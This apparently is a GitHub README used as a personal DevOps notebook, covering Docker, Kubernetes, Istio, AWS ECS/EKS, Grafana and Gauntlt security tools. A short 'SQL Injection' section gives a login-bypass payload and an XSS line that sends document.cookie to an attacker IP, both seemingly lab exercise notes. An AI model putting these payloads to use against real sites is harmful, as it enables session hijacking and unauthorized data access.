# Build-and-Dockerize-a-Full-stack-React-app-with-Node.js-MySQL-and-Nginx-for-reverse-proxy

Run `npm i` inside the client directory

Run `npm i` inside the server directory

Run `docker-compose up --build` inside the mainn project directory

Access the Adminer using route `http://localhost:8000/`.

To log in, use `mysql_db` as the server Username as `root` and password as `MYSQL_ROOT_PASSWORD`.

Get all resources in a namespac
`kubectl -n <NAMESPACE> get $(kubectl api-resources --namespaced=true --no-headers -o name | egrep -v 'events|nodes' | paste -s -d, - ) --no-headers`

Set `eval $(minikube docker-env)` to be able to pull images locally on k8s

To be able to access your app outside k8s, use LoadBalancer type instead of NodePort

Make sure you start minikube tunnel before you apply the changes on your services `minikube tunnel`

Add ingress addons `minikube addons enable ingress`

https://minikube.sigs.k8s.io/docs/handbook/accessing/#run-tunnel-in-a-separate-terminal

Delete all the resources in a namespace `kubectl delete all --all -n {my-namespace}`

To connect to a pod container that uses ClusterIP, use the clusterIP gotten from `kubectl get services`

To access a pod container locally, use the external IP <LoadBalancer service>

To get the description of a master node: `kubectl describe nodes -l node-role.kubernetes.io/control-plane | more`

To launch minikube dashboard, you need to first enable the dashboard, then run `minikube dashboard`

Using Kubectl port forwarding
Using kubectl port forwarding, you can access a pod from your local workstation using a selected port on your localhost. This method is primarily used for debugging purposes.

- get the pod name `kubectl get pods --namespace=<namespace>`
- run `kubectl port-forward <pod-name> 8080:<pod-port> -n <namespace>`

restart deployment `kubectl rollout restart deployment <deployment_name> -n <namespace> `

to configure the context to a particular namespace `kubectl config set-context --current --namespace=<NAMESPACE_NAME>

run command inside a pod `kubectl exec -it <pod-name> sh`

get all pods in specific node `kubectl get pods --all-namespaces -o wide --field-selector spec.nodeName=<node> `

- `targetPort` is the pod port itself
- `port` is the port you are exposing to other pods or internet

// add grafana manually

- login to grafana `{username: admin, password: admin}`
- go to configuration
- add new datasource: Prometheus
- get container ip `docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' <container_name_or_id>`

install metric-server on your cluster to get k8s metrics like CPU and memory usage `kubectl apply -f https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yaml`

create master and worker nodes `kind create cluster --name monitoring --image kindest/node:v1.23.1 --config kind.yaml`

- view your external public ip address `curl -s ifconfig.co`

### OSI

The Open Systems Interconnection (OSI) model describes seven layers that computer systems use to communicate over a network.
https://www.imperva.com/learn/application-security/osi-model/

## GauntIt

Gauntlt is a security testing framework that uses a command-line interface (CLI) for running security tests, or attacks. Gauntlt provides a report of tests that passed and failed similar to other automated testing frameworks. Gauntlt integrates with many popular security tools and is easily extendable to perform custom security tests

**To gain some insight into the attack adapters, the following bullets summarize the use cases for each**:

arachni: Web application security scanner
curl: A tool for transferring data, but useful for testing if something exists
dirb: A web content scanner that can be used to discover hidden pages, such as administrator log in pages
garmr: Inspects website responses for basic security requirements based on Mozilla's web application security coding guidelines
heartbleed: Tests for the heartbleed vulnerability
nmap: Network mapper for performing port scans for penetration testing
sqlmap: Detects SQL injection flaws for a variety of database management systems
sslyze: Analyzes SSL configuration and can identify weak cipher suites and other vulnerabilities

#### Isito

DestinationRules are policies that apply to traffic after the traffic has been routed by a VirtualService resource. They can be used to configure load-balancing, timeouts, connections limits and more. In this lab, Subsets are defined on the DestinationRule to split traffic between two different versions of the same application.

In Istio, the Gateway resource describes a load-balancer. Gateway options you can configure include:

Which ports should be exposed
Protocol of the traffic
Server Name Indication (SNI) configuration (used to host multiple secure websites through a single IP address)

A VirtualService is used to route traffic. It is similar to the Kubernetes Ingress resource. However, it is more configurable and can be used to route internal cluster traffic in addition to external traffic.

#### SQL Injection

code: `a' OR 1=1#`
Notice that you have inserted a second condition (1=1) which you know will always equate to TRUE, and also the a character, which will force the database to conclude that there are no users with that User ID (since each user has a number as an ID). This will force the database to evaluate the second condition, and because we know that condition to always be true, it will return all records from the database.

code to get cookies `<script>new Image().src=”http://192.168.1.80/b.php?”+document.cookie;</script> `

### Build docker locally and run it

`docker build -t <docker-image-name> directory`
`docker run -d -p <port>:<expose-port> <docker-image-name>`

### Deploy a dockerized app to AWS

**Tasks** are JSON files that describe how a container should be run. For example, you need to specify the ports and image location for your application. A **service** simply runs a specified number of tasks and restarts/kills them as needed. This has similarities to an auto-scaling group for EC2. A **cluster** is a logical grouping of services and tasks. This will become more clear as we build.

[youtube](https://www.youtube.com/watch?v=zs3tyVgiBQQ)

- login into ecr using aws-cli `aws ecr get-login-password --region <region> | docker login --username AWS --password-stdin <account-id>.dkr.ecr.<region>.amazonaws.com`
- create a new ecr repo
- tag the docker image with the ecr image uri ` docker tag <current-image>:latest <ecr-image-uri>:latest`
- push the tagged docker image `docker push <docker-image>`
- create a cluster
- create a task definition
- run a task

Remember to add platform to your image if you are planning to run it else on a Linux machine because by default when an image is built on a M1 chip, docker automatically append arm64 to the image platform type`docker build --platform=linux/amd64 -t server2 .`

### Deploy K8s on EKS

EKS is a managed k8s service, it manages the master nodes, it handles scaling and backups.

# steps

- install eksctl
- create a cluster `eksctl create cluster --name test-cluster1 --version 1.19 --region us-east-1 --nodegroup-name linux-nodes --node-type t2.micro --nodes 2 --zones us-east-1a,us-east-1b,us-east-1c`
- deploy your k8s apps by running kubectl apply -f
- nslookup the load balancer external ip to see if it's live

### EKSCTL VS KOPS

eksctl is specifically meant to bootstrap clusters using Amazon's managed Kubernetes service (EKS). With EKS, Amazon will take responsibility for managing your Kubernetes Master Nodes (at an additional cost).

kops is a Kubernetes Installer. It will install kubernetes on any type of node (e.g. an amazon ec2 instance, local virtual machine). But you will be responsible for maintaining the master nodes (and the complexity that comes with that).

### Deploy a dockerized app to AWS using Terraform

(Article)[https://medium.com/avmconsulting-blog/how-to-deploy-a-dockerised-node-js-application-on-aws-ecs-with-terraform-3e6bceb48785]

### Deploy k8s cluster on AWS using Terraform

https://learn.hashicorp.com/tutorials/terraform/eks

- change the context `aws eks --region $(terraform output -raw region) update-kubeconfig --name $(terraform output -raw cluster_name)`


- get contexts `kubectl config get-contexts`

# Materials:

https://devopscube.com/setup-prometheus-monitoring-on-kubernetes/
https://devopscube.com/setup-kube-state-metrics/
https://devopscube.com/alert-manager-kubernetes-guide/
https://devopscube.com/setup-grafana-kubernetes/
https://devopscube.com/node-exporter-kubernetes/

https://devopscube.com/setup-kubernetes-cluster-google-cloud/
https://devopscube.com/kubernetes-cluster-vagrant/

---

https://blog.marcnuri.com/prometheus-grafana-setup-minikube
https://opensource.com/article/21/6/chaos-grafana-prometheus
https://adamtheautomator.com/minikube-dashboard/
https://phoenixnap.com/kb/prometheus-kubernetes-monitoring
https://medium.com/stakater/k8s-deployments-vs-statefulsets-vs-daemonsets-60582f0c62d4
https://github.com/camilb/prometheus-kubernetes
https://blog.container-solutions.com/prometheus-operator-beginners-guide

---

# HPA K8s

https://kubernetes.io/docs/tasks/run-application/horizontal-pod-autoscale-walkthrough/
https://kubernetes.io/docs/tasks/run-application/horizontal-pod-autoscale

---

https://github.com/cloudacademy/devops-jenkins-docker-splunk
https://github.com/cloudacademy/devops-jenkins-jira

---

Cloud Native Bootcamp (IBM)

- https://cloudnative101.dev/course-overview
